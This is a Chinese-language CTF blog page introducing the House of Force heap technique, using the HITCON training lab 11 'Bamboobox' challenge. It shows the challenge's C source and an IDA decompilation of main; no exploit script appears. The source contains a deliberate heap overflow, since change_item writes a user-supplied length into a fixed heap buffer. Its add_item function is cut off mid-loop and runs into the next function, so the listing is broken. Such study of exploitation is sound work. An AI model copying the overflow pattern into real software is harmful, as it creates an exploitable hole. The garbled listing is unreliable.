<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Force | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Force</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-12T15:14:29.000Z" id="date"> 2023-09-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-12T09:16:22.336Z" id="updated"> 2023-09-12</time></div></span></div></div><hr><div id="post-content"><h1 id="PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）"><a href="#PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）" class="headerlink" title="PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）"></a>PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）</h1><p>参考资料：<br>CTF-wiki：<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a><br>附件下载：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA">https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA</a>  密码: np57<br>–来自百度网盘超级会员V3的分享<br>    House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。</p>
<p>题目来源：HITCON training lab 11<br>附件：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ">https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ</a>  密码: abtk<br>–来自百度网盘超级会员V3的分享</p>
<h2 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h2><p>老规矩，checksec一下文件先</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png'><img src="https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png" alt="Snipaste_2023-09-12_17-08-13.png"></p>
<p>计算一下 main_arena 距离 libc 的距离</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/12/aDliI4HtRFV1Sq7.png'><img src="https://s2.loli.net/2023/09/12/aDliI4HtRFV1Sq7.png" alt="Snipaste_2023-09-12_17-05-27.png"></p>
<h2 id="程序的源代码-c"><a href="#程序的源代码-c" class="headerlink" title="程序的源代码(c)"></a>程序的源代码(c)</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">struct</span> item <span class="token punctuation">{</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> item itemlist<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> num<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">hello_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There is a box with magic"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what do you want to do in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">goodbye_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you next time"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thanks you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">struct</span> box <span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>hello_message<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>goodbye_message<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bamboobox Menu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1.show the items in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2.add a new item"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3.change the item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4.remove the item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5.exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>num<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>itemlist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d : %s"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> itemlist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">add_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">char</span> sizebuf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> length<span class="token punctuation">;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sizebuf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    length <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>sizebuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild length"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">change_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">char</span> indexbuf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> lengthbuf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> length<span class="token punctuation">;</span>
  <span class="token keyword">int</span> index<span class="token punctuation">;</span>
  <span class="token keyword">int</span> readsize<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>num<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> indexbuf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    index <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>indexbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>itemlist<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> lengthbuf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      length <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>lengthbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the new name of the item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      readsize <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> itemlist<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>itemlist<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">+</span> readsize<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> indexbuf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> index<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>num<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> indexbuf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    index <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>indexbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>itemlist<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">free</span><span class="token punctuation">(</span>itemlist<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
      itemlist<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      itemlist<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"remove successful!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      num<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">char</span> choicebuf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> box <span class="token operator">*</span>bamboo<span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  bamboo <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> box<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  bamboo<span class="token operator">-></span>hello_message <span class="token operator">=</span> hello_message<span class="token punctuation">;</span>
  bamboo<span class="token operator">-></span>goodbye_message <span class="token operator">=</span> goodbye_message<span class="token punctuation">;</span>
  bamboo<span class="token operator">-></span><span class="token function">hello_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> choicebuf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    choice <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>choicebuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>choice<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
      <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
      <span class="token function">add_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
      <span class="token function">change_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
      <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>
      bamboo<span class="token operator">-></span><span class="token function">goodbye_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild choice!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a><strong>IDA静态分析</strong></h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>hello_message<span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>goodbye_message<span class="token punctuation">;</span>
  <span class="token punctuation">(</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token function">add_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token function">change_item</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
        <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>
        v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token punctuation">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild choice!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
